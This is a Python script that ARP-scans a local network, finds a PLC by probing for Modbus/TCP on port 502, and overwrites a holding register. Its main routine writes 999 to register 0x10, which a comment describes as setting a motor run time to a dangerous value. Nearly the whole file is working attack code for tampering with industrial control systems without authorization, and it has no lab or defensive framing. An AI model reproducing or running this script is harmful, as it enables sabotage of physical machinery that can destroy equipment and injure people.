from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient
import time

# --------------- Step 1: Discover the PLC's IP Address ---------------
def discover_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network for PLC...")
    
    # Create ARP request packet
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send packet and receive response
    result = srp(packet, timeout=2, verbose=False)[0]
    
    devices = {}  # Dictionary to store IP and MAC addresses
    
    for sent, received in result:
        devices[received.psrc] = received.hwsrc  # IP -> MAC mapping

    # Identify PLC (Assuming PLC MAC vendor lookup is unavailable, check known IPs)
    for ip in devices:
        print(f"[*] Found device: {ip} ({devices[ip]})")
        
        # HEURISTIC: Assume PLC is a device responding on Modbus (Port 502 check)
        if check_modbus(ip):
            print(f"[+] Identified PLC at {ip}")
            return ip
            
    print("[-] No PLC found on network.")
    return None

# --------------- Step 2: Check if a device is responding on Modbus/TCP ---------------
def check_modbus(ip):
    try:
        client = ModbusTcpClient(ip)
        result = client.connect()
        client.close()
        return result
    except:
        return False

# --------------- Step 3: Modify a PLC Parameter ---------------
def modify_plc_parameter(plc_ip, register=0x10, new_value=120):
    """Modify a control parameter on the PLC by writing to Modbus register."""
    print(f"[*] Attempting to modify PLC parameter at {plc_ip}...")
    
    client = ModbusTcpClient(plc_ip)
    
    if client.connect():
        print(f"[+] Connected to PLC at {plc_ip}")
        
        # Read current value
        current_value = client.read_holding_registers(register, 1)
        if current_value.isError():
            print("[-] Failed to read current PLC register value.")
        else:
            print(f"[+] Current value in register {register}: {current_value.registers[0]}")
        
        # Modify the parameter
        response = client.write_register(register, new_value)
        
        if response.isError():
            print("[-] Failed to modify PLC parameter.")
        else:
            print(f"[+] Successfully modified register {register} to {new_value}")
        
        client.close()
    else:
        print("[-] Failed to connect to PLC.")

# --------------- Main Execution ---------------
if __name__ == "__main__":
    # Discover PLC IP
    plc_ip = discover_plc_ip()

    if plc_ip:
        # Modify a register value (E.g., setting motor run time to dangerous value)
        modify_plc_parameter(plc_ip, register=0x10, new_value=999)
    else:
        print("[-] No PLC found. Exiting.")